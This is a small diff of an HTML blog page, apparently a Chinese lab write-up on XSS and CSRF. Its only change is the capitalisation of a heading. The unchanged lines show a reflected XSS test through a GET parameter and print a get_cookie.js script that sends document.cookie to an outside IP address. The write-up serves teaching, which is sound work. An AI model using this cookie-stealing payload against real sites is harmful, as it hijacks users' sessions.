@@ -18,7 +18,7 @@
 <li>xss: 通过客户端脚本语言（最常见如：JavaScript），在网页上注入恶意脚本，且代码内容请求外部服务器。</li>
 <li>csrf: 又称XSRF，冒充用户发起请求（在用户不知情的情况下）,完成一些违背用户意愿的请求（如恶意发帖，删帖，改密码，发邮件等）。</li>
 </ul>
-<h3 id="反射性xss-get"><a href="#反射性xss-get" class="headerlink" title="反射性xss(get)"></a>反射性xss(get)</h3><p>首先尝试下输入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>, 发现有字数限制, 然而通过观察或者抓包可以发现参数是通过GET上传的, 那么把刚才的代码赋值给参数message后, 成功的弹窗.<br>然后在服务器写入下面两个文件</p>
+<h3 id="反射性xss-GET"><a href="#反射性xss-GET" class="headerlink" title="反射性xss(GET)"></a>反射性xss(GET)</h3><p>首先尝试下输入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>, 发现有字数限制, 然而通过观察或者抓包可以发现参数是通过GET上传的, 那么把刚才的代码赋值给参数message后, 成功的弹窗.<br>然后在服务器写入下面两个文件</p>
 <ul>
 <li><code>get_cookie.js</code><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="keyword">new</span> Image();</span><br><span class="line">img.src = <span class="string">"http://188.131.227.20:999/myxss/index.php?cookie="</span> + <span class="built_in">document</span>.cookie;</span><br><span class="line"><span class="built_in">document</span>.body.append(img);</span><br></pre></td></tr></table></figure>
 
